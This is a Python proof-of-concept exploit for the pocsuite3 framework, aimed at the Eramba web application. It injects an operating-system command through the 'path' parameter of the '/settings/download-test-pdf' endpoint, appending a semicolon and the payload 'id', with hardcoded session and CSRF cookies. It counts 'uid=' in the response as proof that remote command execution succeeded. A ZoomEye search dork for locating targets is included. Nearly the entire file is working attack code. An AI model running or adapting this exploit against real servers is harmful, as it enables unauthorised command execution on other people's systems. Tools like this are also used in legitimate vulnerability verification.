from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger,
    OptString, OrderedDict,
    random_str,
    CEye,
    get_listener_ip, get_listener_port, REVERSE_PAYLOAD
)
from urllib.parse import urljoin

minimum_version_required('1.9.11')


class POC(POCBase):
    name = 'Eramba远程代码执行'
    vulType = 'Command Execution'
    desc = 'Vulnerability description'
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': 'Eramba'}

    def _exploit(self, param=''):
        vuln_path = f'/settings/download-test-pdf?path={param};'
        url = urljoin(self.url, vuln_path)
        header = {
            "Cookie": "translation=1; csrfToken=1l2rXXwj1D1hVyVRH%2B1g%2BzIzYTA3OGFiNWRjZWVmODQ1OTU1NWEyODM2MzIwZTZkZTVlNmU1YjY%3D; PHPSESSID=14j6sfroe6t2g1mh71g2a1vjg8",
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
            "Accept-Language": "de,en-US;q=0.7,en;q=0.3",
            "Accept-Encoding": "gzip, deflate",
            "Referer": "https://[redacted]/settings",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Te": "trailers",
            "Connection": "close"
        }
        res = requests.get(url, headers=header, verify=False, timeout=5)
        return res.text

    def _verify(self):
        result = {}
        param = f'id'
        res = self._exploit(param)
        if 'uid=' in res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['url'] = self.url
            result['VerifyInfo']['payload'] = param
        return self.parse_output(result)


register_poc(POC)
